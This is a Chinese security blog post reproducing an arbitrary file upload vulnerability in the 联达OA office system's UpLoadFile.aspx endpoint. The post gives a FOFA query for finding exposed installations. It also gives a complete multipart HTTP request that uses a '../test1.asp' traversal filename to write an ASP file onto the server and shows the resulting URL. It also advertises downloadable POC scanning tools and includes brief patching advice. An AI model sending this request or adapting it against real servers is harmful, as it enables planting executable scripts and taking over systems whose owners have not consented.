#  联达OA UpLoadFile.aspx接口存在任意文件上传漏洞   
南风徐来  南风漏洞复现文库   2024-04-01 23:12  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 联达OA UpLoadFile.aspx接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
联达oa是北京联达动力信息科技股份有限公司推出的新一代OA系统,支持100+应用自行安装与定义,应用表单自定义,支持应用无代码开发,支持多语言。  
## 2.漏洞描述  
  
联达oa是北京联达动力信息科技股份有限公司推出的新一代OA系统,支持100+应用自行安装与定义,应用表单自定义,支持应用无代码开发,支持多语言。联达OA UpLoadFile.aspx接口存在任意文件上传漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
联达OA  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLHdkleyYaK55icdlLI5nJGzCjj7qg1uIS51JyoK3lyfCGMceYgwtCjNQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
联达OA UpLoadFile.aspx接口存在任意文件上传漏洞  
## 4.fofa查询语句  
  
app="联达OA"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/FileManage/UpLoadFile.aspx  
  
漏洞数据包：  
```
POST /FileManage/UpLoadFile.aspx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 272
Content-Type: multipart/form-data; boundary=07800d96bad08d24dd59e3285dc16968

--07800d96bad08d24dd59e3285dc16968
Content-Disposition: form-data; name="file"; filename="../test1.asp"
Content-Type: image/png

tteesstt1
--07800d96bad08d24dd59e3285dc16968
Content-Disposition: form-data; name="DesignId"

1
--07800d96bad08d24dd59e3285dc16968--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLzIZZkHakLBO8z2erkHYWarMiaweM8pfcCLtfJMdWgvGG7t18YuzTiaqQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
上传后的地址 http://127.0.0.1/FileManage/test1.asp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLzxoWQkhgGWxKXBw9TOo5DaoicehCib69pQkfgdDHHF6J3ibqWcxaIoxaA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现113 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLSLyFYoyLIKOGaB7tfHEg69NcMia0aibibVa2IfAVgh5zOicHLOzeW3UviaA/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLTMEic5HNgGcgbQMSic6rW3sFGwOiaEdSrEF5PmnDU4FKlqAtuNwAIcm4A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLr61RuKTkOwicwX4S3jJgGpX9SS62dFD1RfGd95klPdIu6zhITDZMkuA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLo0J6cyWYepX6QxnFYxrymcxsQU9moQrA130sFXvNukic0o3JcAU790A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLkesicx57puCwGtenUDMUNhwVEVJWT4JpwKjhk691Bll35CRxH5ibb0Ng/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a6jsr6gWbK7LibLibibET6ICLQgNp9odzpWEDKjLFF0jxiajXBXv67SE04ibeOCeDaqiaoa2KpFlj9ZlTQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
1.联系相关厂商http://www.liandadongli.com，获取安全补丁，及时进行漏洞修复 2.联系相关安全厂商，及时更新安全阻断策略  
## 8.往期回顾  
  
  
[用友NC Cloud nc.bs.sm.login2.RegisterServlet接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485943&idx=1&sn=2287057cc4406b125320ea4c2e730c80&chksm=974b84f0a03c0de6ff44c88c20b5dc22cb748234bdf640fefb12feb3815f17d97e071dc7fe64&scene=21#wechat_redirect)  
  
  
[大华DSS Digital Surveillance System系统login_login.action存在远程命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485929&idx=1&sn=a7b531bc8c31e30449d23fb2508bba27&chksm=974b84eea03c0df82ac99414eae0e5c93563e9fcabbad855714aff318adba1ab281ad73597c5&scene=21#wechat_redirect)  
  
  
